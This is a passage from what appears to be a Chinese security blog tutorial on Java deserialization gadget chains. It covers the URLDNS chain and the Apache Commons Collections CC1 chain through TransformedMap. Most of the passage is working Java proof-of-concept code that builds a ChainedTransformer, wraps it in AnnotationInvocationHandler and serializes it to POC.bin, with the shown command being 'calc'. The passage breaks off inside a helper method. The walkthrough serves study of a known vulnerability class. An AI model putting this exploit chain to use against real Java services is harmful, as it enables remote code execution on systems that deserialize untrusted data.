                <span class="token keyword">protected</span> <span class="token keyword">synchronized</span> <span class="token class-name">InetAddress</span> <span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token class-name">URL</span> u<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用GPT来解释题解：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/urldns%E8%A7%A3%E9%87%8A.png"></p>
<p>大概意思就是，现在URL类可以被序列化和反序列化，在<code>HashMap</code>这个类中有readObject方法（<code>readObject</code> 方法是 Java 中的一个特殊方法，用于自定义反序列化的过程。当对象被反序列化时，<code>ObjectInputStream</code> 会调用该方法来重建对象的状态。这样可以在对象被反序列化时执行一些特殊的逻辑，例如对反序列化后的字段进行验证、修正或者初始化），这个方法在反序列化时会自动触发，且可接受一个参数，而<code>HashMap</code>中存在一个hashcode方法，在URL类中也存在一个hashcode方法，当我们把url类当参数传入hashmap中的readObject中时，就会从原本的调用hashmap中的hashcode转而调用URL中的hashcode，从而实现对目标类的调用。</p>
<p>hashmap → readObject → hash -URL.hashcode → getHostAddress → InetAddress.getByName(host);</p>
<h2 id="CC1链流程"><a href="#CC1链流程" class="headerlink" title="CC1链流程"></a>CC1链流程</h2><p>cc1通常有两个类可以用来攻击，TransformMap和LazyMap，我们先讲解TransformMap这条链子：</p>
<h3 id="利用TransformMap进行攻击"><a href="#利用TransformMap进行攻击" class="headerlink" title="利用TransformMap进行攻击"></a>利用TransformMap进行攻击</h3><p>按前人的经验来说，通常我们可以看实现<code>Transformer</code>接口的类</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720408259527-f03bccc5-edc3-418b-a392-fc099255a883.png"></p>
<p>然后直接进<code>InvokerTransformer</code>这个类当中看，在这个类当中发现一个<code>transform</code>方法，可以通过反射任意调用类：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720408268895-814e5c8e-7cd5-47d5-8118-5562cbae86a0.png"></p>
<p>我们可以尝试通过这个类来执行命令，来执行命令调用计算器。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> test6 <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        invokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>runtime<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/cc1-3.png"><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720408277019-e7b7671e-0370-407f-88ff-52d9cc406c1a.png"></p>
<p>这样就能执行calc命令调用计算器。既然能够执行命令，那么接下来就可以尝试寻找链子了</p>
<p>现在我们需要一个同样有<code>transform</code>这个方法的函数，在全局查找后在<code>TransformedMap</code>类中找到一个 <code>checkSetValue()</code> 方法调用了 <code>transform()</code> 方法。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/cc1-4.png"><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720408285125-fdb3a2da-a984-4579-897f-8f1df00f3fd6.png"></p>
<p>查到这里后我们我们看<code>valueTransformer.transform</code>当中的<code>valueTransformer</code>的位置，最终在<code>TransformerMap</code>的构造方法中有这个参数。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/cc1-5.png"><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720408291578-18a61d1b-4aeb-44c9-bc8e-a98290753c32.png"></p>
<p>因为构造方法是<code>protected</code>，所以现在我们需要寻找利用<code>TransformedMap</code>构造方法。然后在<code>TransformerMap</code>中的<code>Map decorate</code>中找到了对构造方法的调用。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/cc1-6.png"><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720408298939-80eddbc2-af0d-42cd-be37-9f53daedc86d.png"></p>
<p>找到这一步就可以直接写利用链了</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test5</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> oo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> destop <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>oo<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">TransformedMap</span><span class="token punctuation">></span></span> transformedMapClass <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
        <span class="token class-name">Method</span> checkSetValueMethod <span class="token operator">=</span> transformedMapClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"checkSetValue"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        checkSetValueMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        checkSetValueMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>destop<span class="token punctuation">,</span> runtime<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大致思路为：</p>
<ul>
<li>在<code>InvokerTransformer</code>中存在<code>transform</code>方法，可以通过<code>invoke</code>方法来进行反射的任意类的调用</li>
<li>在<code>TransformedMap</code>类中一个<code>checkSetValue</code>方法，存在<code>valueTransformer.transform(value)</code>其中<code>valueTransformer</code>参数时可以控制的，在<code>TransformedMap</code>构造方法的方法中控制。</li>
<li>然后因为<code>TransformedMap</code>是<code>protected</code>的，所以我们需要找一个调用<code>TransformedMap</code>构造方法的其他方法。</li>
<li>然后找到一个<code>Map</code>类的静态方法中调用了<code>TransformedMap</code>这个方法，然后就可以构造了。</li>
</ul>
<p>现在的链子中，我们只找到了<code>checkSetValue</code>，由于方法<code>.transform</code>无法继续向下寻找，所以我们只能通过<code>checkSetValue</code>继续向下寻找，查找用法，发现在<code>AbstractInputCheckedMapDecorator</code>类中存在一个静态的内部类<code>MapEntry</code>继承<code>AbstractInputCheckedMapDecorator</code>，其中的<code>setValue</code>方法存在调用同名方法<code>checkSetValue</code>的情况：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/cc1-7.png"><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720408321865-328485a1-e230-4a88-ba2a-e8415e17c839.png"></p>
<p>然后我们查看重写这个类的其他类，找到一个，跟进去发现一个定义的接口</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/cc1-8.png"><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720408326258-f6b66f36-f20a-40a7-9fc9-986c51289562.png"></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/cc1-9.png"><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720408332581-6e783aeb-33ab-4661-950a-ad8d5d144aad.png"></p>
<p>所以，我们在进行<code>.decorate</code>调用时，进行<code>Map</code>类的遍历时，会进入到<code>setValue</code>中，而<code>setValue</code>会按上面的流程来调用<code>checkSetValue</code>，然后就可以按最上面的流程进行命令执行，现在修改下代码：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">public</span> <span class="token keyword">class</span> decorateCalc <span class="token punctuation">&#123;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span>  
 <span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token class-name">Map</span> decorateMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">TransformedMap</span><span class="token punctuation">></span></span> transformedMapClass <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>  
 <span class="token class-name">Method</span> checkSetValueMethod <span class="token operator">=</span> transformedMapClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"checkSetValue"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 checkSetValueMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 checkSetValueMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> runtime<span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在其中有几个问题：</p>
<ol>
<li>Runtime的对象无法被序列化，需要用反射使其变为可序列化形式</li>
<li><code>setValue()</code>的传参，需要传<code>Runtime</code>对象，而在实际情况中的<code>setValue</code>的传参是传递的</li>
</ol>
<p>问题一很好解决，我们直接通过InvokerTransformer中的transform方法反射调用Runtime的对象即可。<br>问题二，存在一个Constansformer类中同样存在transform方法，但他是你输入哪一个对象，有他就返回哪一个对象<br><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720772475052-59609b3d-92b0-4d6a-868a-c53fae2a981c.png"></p>
<p>因此，我们可以通过这个类来进行setValue的传参，最终poc如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token constant">CC1</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
         <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map1 <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Constructor</span> ctor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> ctor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>map1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">serialize</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"POC.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"POC.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
